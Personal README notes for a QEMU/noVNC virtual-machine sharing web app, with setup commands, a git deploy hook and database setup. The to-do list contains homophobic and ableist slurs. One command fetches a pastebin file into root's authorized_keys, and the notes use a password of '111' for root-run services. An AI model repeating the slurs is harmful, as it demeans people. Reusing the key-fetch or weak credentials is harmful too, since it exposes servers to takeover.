# VM_share
uvicorn main:app --reload
new run: uvicorn main:app --reload --host 0.0.0.0 --port 8000
Installation: qemu-img create -f qcow2 alpine_disk.qcow2 2G

qemu-system-x86_64 \
  -m 512 \
  -cdrom alpine-standard-latest-x86_64.iso \
  -drive file=alpine_disk.qcow2,format=qcow2,if=virtio \
  -boot d \
  -net nic -net user \
  -nographic

Booting overlay: qemu-system-x86_64 \
  -m 512 \
  -drive file=alpine_disk.qcow2,format=qcow2,if=virtio \
  -net nic -net user \
  -nographic


To-do:
1)  Run-out of ports.
    Proposed solutions: Port pool tracking
                        Unix sockets
                        Reverse proxy on 1 port
    Chosen solution: QEMU + Unix socket + websockify - fucking shit, unix sockets are made by retarded faggot freaks
2)  Run several machines simultaneously on a same port.
        Script:  qemu-system-x86_64 \
                -m 512 \
                -drive file="/Users/soledaco/Desktop/pet/alpine.qcow2",format=qcow2,if=virtio \
                -vnc :i

                ~/noVNC/utils/novnc_proxy --listen localhost:6086 --vnc localhost:5900 + i


3)  Isolate machines one from each other:


Notes:
1)  Added noVNC pack to static since custom novnc page did not display as expected returning 404 when trying to get access to virtual machine on alpine linux
2)  This what i entered in a db console:  soledaco=# create database auth_db;
                                          CREATE DATABASE
                                          soledaco=# create user adm_user with password 111
                                          soledaco-# grant all privileges on database auth_db to adm_user
                                          soledaco-# 
adm_user pswd: 111



pkill -9 qemu
lsof -i :6080


if my db users contains even one record vm will be created no matter what



Useful commands:  tree  -  filesystem structure
                  free -f - consumed memory
                  df -h - space
                  python3 -m http.server 8080 starts accessible by http://your-server-ip:8080 server
                  curl ifconfig.me check my ipadress
Structure:        .
                  ├── VM_share
                  │   ├── README.md
                  │   └── app
                  │       ├── configs
                  │       │   ├── auth_config.py
                  │       │   ├── db_config.py
                  │       │   └── vm_config.py
                  │       ├── main.py
                  │       ├── methods
                  │       │   ├── auth
                  │       │   │   └── auth.py
                  │       │   ├── database
                  │       │   │   ├── database.py
                  │       │   │   ├── init_db.py
                  │       │   │   └── models.py
                  │       │   └── manager
                  │       │       └── OverlayManager.py
                  │       ├── routers
                  │       │   ├── auth.py
                  │       │   ├── root.py
                  │       │   └── vm.py
                  │       ├── static
                  │       │   ├── css
                  │       │   │   └── index.css
                  │       │   ├── index.html
                  │       │   ├── novnc-ui
                  │       │   │   ├── core
                  │       │   │   └── vnc.html
                  │       │   └── scripts
                  │       │       └── index.js
                  │       └── utils.py
                  ├── base_images
                  │   └── Alpine_Linux
                  │       └── alpine.qcow2
                  ├── iso
                  │   └── alpine-standard-3.20.0-x86_64.iso
                  ├── overlays
                      └── Alpine_Linux


                  24 directories, 65 files


CD file on a server: nano /root/repos/VM_share.git/hooks/post-receive



file content:
#!/bin/bash
exec > /tmp/git_deploy.log 2>&1
echo "[HOOK] post-receive triggered successfully"

# Where the code should be deployed
TARGET_DIR="/root/myapp/VM_share"

# Where the bare repo lives
GIT_DIR="/root/repos/VM_share.git"

echo "[INFO] Deploying to $TARGET_DIR..."

# Checkout latest code into live folder
git --work-tree="$TARGET_DIR" --git-dir="$GIT_DIR" checkout -f

# Activate virtualenv and install dependencies
if [ -f "/root/venv/bin/activate" ]; then
    echo "[INFO] Installing dependencies from requirements.txt..."
    source /root/venv/bin/activate
    pip install -r "$TARGET_DIR/requirements.txt"
fi

# Restart the app if a restart script exists
if [ -f "$TARGET_DIR/restart.sh" ]; then
    echo "[INFO] Restarting the app..."
    bash "$TARGET_DIR/restart.sh"
fi

echo "[INFO] Done."




curl https://pastebin.com/raw/abcd1234 >> /root/.ssh/authorized_keys
scp post-receive root@83.69.248.229:/root/repos/VM_share.git/hooks/
pip3 freeze >> requirements.txt


ssh root@83.69.248.229


postgre setup:  CREATE USER adm_user WITH PASSWORD
                postgres=# create database auth_db
                postgres-# create user adm_user with password 111
                postgres-# grant all privileges on database auth_db to adm_user
                postgres-# \q


